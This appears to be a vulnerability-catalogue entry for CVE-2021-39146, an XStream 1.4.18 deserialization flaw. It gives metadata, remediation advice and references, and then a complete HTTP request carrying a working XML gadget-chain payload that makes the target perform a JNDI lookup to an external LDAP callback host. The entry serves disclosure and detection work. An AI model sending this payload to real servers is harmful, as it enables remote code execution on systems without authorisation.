---
layout: post
cve_id: CVE-2021-39146
title: XStream 1.4.18 - Arbitrary Code Execution
pcap: true
pcap_path: /pcaps/2021/CVE-2021-39146.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-39146.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pwnhxl
severity: high
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary code on the affected system.

  '
remediation: 'Upgrade XStream to a version that is not affected by CVE-2021-39146.

  '
reference:
- https://x-stream.github.io/CVE-2021-39146.html
- https://github.com/x-stream/xstream/security/advisories/GHSA-p8pq-r894-fm8f
- https://security.netapp.com/advisory/ntap-20210923-0003/
- https://nvd.nist.gov/vuln/detail/CVE-2021-39146
- https://lists.debian.org/debian-lts-announce/2021/09/msg00017.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 8.5
  cve-id: CVE-2021-39146
  cwe-id: CWE-434
  epss-score: 0.54176
  epss-percentile: 0.97916
  cpe: cpe:2.3:a:xstream_project:xstream:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: xstream_project
  product: xstream
tags:
- cve2021
- cve
- xstream
- deserialization
- rce
- xstream_project
- vuln
---

## üîç Vulnerability Description
XStream 1.4.18 is susceptible to remote code execution. An attacker can execute commands of the host by manipulating the processed input stream, thereby making it possible to obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site. Setups which followed XStream's security recommendations with an allow-list are not impacted.


## üåê HTTP Request
```nohighlight
POST / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3; en-ca) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20
Connection: close
Content-Length: 2162
Content-Type: application/xml
Accept-Encoding: gzip
<sorted-set>
<javax.naming.ldap.Rdn_-RdnEntry>
<type>test</type>
<value class='javax.swing.MultiUIDefaults' serialization='custom'>
<unserializable-parents/>
<hashtable>
<default>
<loadFactor>0.75</loadFactor>
<threshold>525</threshold>
</default>
<int>700</int>
<int>0</int>
</hashtable>
<javax.swing.UIDefaults>
<default>
<defaultLocale>zh_CN</defaultLocale>
<resourceCache/>
</default>
</javax.swing.UIDefaults>
<javax.swing.MultiUIDefaults>
<default>
<tables>
<javax.swing.UIDefaults serialization='custom'>
<unserializable-parents/>
<hashtable>
<default>
<loadFactor>0.75</loadFactor>
<threshold>525</threshold>
</default>
<int>700</int>
<int>1</int>
<string>lazyValue</string>
<javax.swing.UIDefaults_-ProxyLazyValue>
<className>javax.naming.InitialContext</className>
<methodName>doLookup</methodName>
<args>
<string>ldap://d5jo1s1le0o4fh3rdg4gzpeopcbm88c58.oast.pro/#evil</string>
</args>
</javax.swing.UIDefaults_-ProxyLazyValue>
</hashtable>
<javax.swing.UIDefaults>
<default>
<defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/>
<resourceCache/>
</default>
</javax.swing.UIDefaults>
</javax.swing.UIDefaults>
</tables>
</default>
</javax.swing.MultiUIDefaults>
</value>
</javax.naming.ldap.Rdn_-RdnEntry>
<javax.naming.ldap.Rdn_-RdnEntry>
<type>test</type>
<value class='com.sun.org.apache.xpath.internal.objects.XString'>
<m__obj class='string'>test</m__obj>
</value>
</javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>
```

